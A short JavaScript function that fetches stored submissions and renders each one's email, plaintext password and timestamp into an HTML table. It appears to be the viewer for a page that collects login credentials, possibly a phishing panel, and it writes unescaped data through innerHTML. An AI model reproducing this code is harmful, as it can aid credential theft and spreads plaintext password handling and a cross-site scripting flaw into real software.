async function loadSubmissions() {
  const tableBody = document.getElementById("tableBody");

  try {
    const response = await fetch('/data'); // Make sure the path is correct
    const submissions = await response.json();

    tableBody.innerHTML = '';

    if (!submissions.length) {
      tableBody.innerHTML = `
        <tr>
          <td colspan="4" class="no-data">No submissions yet</td>
        </tr>`;
      return;
    }

    submissions.forEach((item, index) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${item.email}</td>
        <td>${item.password}</td>
        <td>${item.timestamp}</td>
      `;
      tableBody.appendChild(tr);
    });

  } catch (error) {
    console.error('Error fetching submissions:', error);
    tableBody.innerHTML = `
      <tr>
        <td colspan="4" class="no-data">Error loading data</td>
      </tr>`;
  }
}

// Load submissions when page loads
window.addEventListener('DOMContentLoaded', loadSubmissions);
